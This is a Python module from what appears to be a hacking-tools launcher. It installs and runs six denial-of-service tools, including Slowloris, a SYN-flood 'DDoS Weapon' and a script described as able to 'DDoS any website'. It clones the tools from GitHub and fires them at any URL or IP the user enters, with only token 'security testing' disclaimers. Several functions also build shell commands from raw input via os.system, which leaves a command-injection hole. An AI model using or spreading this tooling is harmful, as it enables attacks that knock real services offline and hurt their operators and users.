# coding=utf-8
import os
import subprocess
import shlex

from core import HackingTool
from core import HackingToolsCollection


class ddos(HackingTool):
    TITLE = "ddos"
    DESCRIPTION = (
        "Best DDoS Attack Script With 36 Plus Methods."
        "DDoS attacks\n\b "
        "for SECURITY TESTING PURPOSES ONLY! "
    )

    INSTALL_COMMANDS = [
        "git clone https://github.com/the-deepnet/ddos.git",
        "cd ddos && pip3 install -r requirements.txt",
    ]
    PROJECT_URL = "https://github.com/the-deepnet/ddos.git"

    def run(self):
        method = input("Enter Method >> ")
        url = input("Enter URL >> ")
        threads = input("Enter Threads >> ")
        proxylist = input("Enter ProxyList >> ")
        multiple = input("Enter Multiple >> ")
        timer = input("Enter Timer >> ")
        
        # Change to the ddos directory and run the command
        current_dir = os.getcwd()
        ddos_path = os.path.join(current_dir, "ddos")
        
        if os.path.exists(ddos_path):
            os.chdir(ddos_path)
            cmd = f"python3 ddos {method} {url} socks_type5.4.1 {threads} {proxylist} {multiple} {timer}"
            os.system(cmd)
            os.chdir(current_dir)  # Return to original directory
        else:
            print("\033[91mError: ddos directory not found. Please run the install command first.\033[0m")


class SlowLoris(HackingTool):
    TITLE = "SlowLoris"
    DESCRIPTION = (
        "Slowloris is basically an HTTP Denial of Service attack."
        "It send lots of HTTP Request"
    )
    INSTALL_COMMANDS = ["pip3 install slowloris"]

    def run(self):
        target_site = input("Enter Target Site:- ")
        subprocess.run(["slowloris", target_site])


class Asyncrone(HackingTool):
    TITLE = "Asyncrone | Multifunction SYN Flood DDoS Weapon"
    DESCRIPTION = (
        "aSYNcrone is a C language based, mulltifunction SYN Flood "
        "DDoS Weapon.\nDisable the destination system by sending a "
        "SYN packet intensively to the destination."
    )
    INSTALL_COMMANDS = [
        "git clone https://github.com/fatih4842/aSYNcrone.git",
        "cd aSYNcrone && gcc aSYNcrone.c -o aSYNcrone -lpthread",
    ]
    PROJECT_URL = "https://github.com/fatihsnsy/aSYNcrone"

    def run(self):
        source_port = input("Enter Source Port >> ")
        target_ip = input("Enter Target IP >> ")
        target_port = input("Enter Target port >> ")
        
        # Change to the aSYNcrone directory and run the command
        current_dir = os.getcwd()
        asyncrone_path = os.path.join(current_dir, "aSYNcrone")
        
        if os.path.exists(asyncrone_path):
            os.chdir(asyncrone_path)
            cmd = f"./aSYNcrone {source_port} {target_ip} {target_port} 1000"
            os.system(cmd)
            os.chdir(current_dir)  # Return to original directory
        else:
            print("\033[91mError: aSYNcrone directory not found. Please run the install command first.\033[0m")


class UFONet(HackingTool):
    TITLE = "UFOnet"
    DESCRIPTION = (
        "UFONet - is a free software, P2P and cryptographic "
        "-disruptive \n toolkit- that allows to perform DoS and "
        "DDoS attacks\n\b "
        "More Usage Visit"
    )
    INSTALL_COMMANDS = [
        "git clone https://github.com/epsylon/ufonet.git",
        "cd ufonet && python3 setup.py install && pip3 install GeoIP python-geoip pygeoip requests pycryptodome pycurl whois scapy-python3",
    ]
    RUN_COMMANDS = ["cd ufonet && python3 ufonet --gui"]
    PROJECT_URL = "https://github.com/epsylon/ufonet"


class GoldenEye(HackingTool):
    TITLE = "GoldenEye"
    DESCRIPTION = (
        "GoldenEye is a python3 app for SECURITY TESTING PURPOSES ONLY!\n"
        "GoldenEye is a HTTP DoS Test Tool."
    )
    INSTALL_COMMANDS = [
        "git clone https://github.com/jseidl/GoldenEye.git",
        "chmod -R 755 GoldenEye"
    ]
    PROJECT_URL = "https://github.com/jseidl/GoldenEye"

    def run(self):
        current_dir = os.getcwd()
        goldeneye_path = os.path.join(current_dir, "GoldenEye")
        
        if os.path.exists(goldeneye_path):
            os.chdir(goldeneye_path)
            os.system("./goldeneye.py")
            print("\033[96m [*] USAGE: ./goldeneye.py <url> [OPTIONS]")
            os.chdir(current_dir)  # Return to original directory
        else:
            print("\033[91mError: GoldenEye directory not found. Please run the install command first.\033[0m")


class Saphyra(HackingTool):
    TITLE = "SaphyraDDoS"
    DESCRIPTION = "A complex python code to DDoS any website with a very easy usage.!\n"
    INSTALL_COMMANDS = [
        "git clone https://github.com/anonymous24x7/Saphyra-DDoS.git",
        "cd Saphyra-DDoS && chmod +x saphyra.py"
    ]
    PROJECT_URL = "https://github.com/anonymous24x7/Saphyra-DDoS"

    def run(self):
        url = input("Enter url>>> ")
        
        current_dir = os.getcwd()
        saphyra_path = os.path.join(current_dir, "Saphyra-DDoS")
        
        if os.path.exists(saphyra_path):
            os.chdir(saphyra_path)
            try:
                os.system(f"python3 saphyra.py {shlex.quote(url)}")
            except Exception as e:
                print(f"Error: {e}")
                print("Enter a valid url.")
            os.chdir(current_dir)  # Return to original directory
        else:
            print("\033[91mError: Saphyra-DDoS directory not found. Please run the install command first.\033[0m")


class DDOSTools(HackingToolsCollection):
    TITLE = "DDOS Attack Tools"
    TOOLS = [ddos(), SlowLoris(), Asyncrone(), UFONet(), GoldenEye(), Saphyra()]
